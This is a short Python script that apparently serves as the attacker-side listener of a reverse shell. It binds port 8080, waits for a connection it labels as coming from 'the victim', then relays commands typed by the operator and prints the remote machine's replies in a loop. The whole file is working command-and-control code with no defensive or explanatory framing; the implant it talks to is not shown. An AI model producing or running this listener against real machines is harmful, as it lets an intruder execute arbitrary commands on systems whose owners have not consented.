import socket
import sys

s=socket.socket()
host=""
port=8080
s.bind((host,port))
s.listen(5)
print("binding completed...")
conn,address=s.accept()
print("successfully connected to the victim.....")


def send_command(conn):
    cmd=input()
    if cmd == "quit":
        conn.close()
        s.close()
        sys.exit()
    if len(str.encode(cmd))>0:
        conn.send(str.encode(cmd))
        client_response=str(conn.recv(1024),"utf-8")
        print(client_response,end="")

while True:
    send_command(conn)














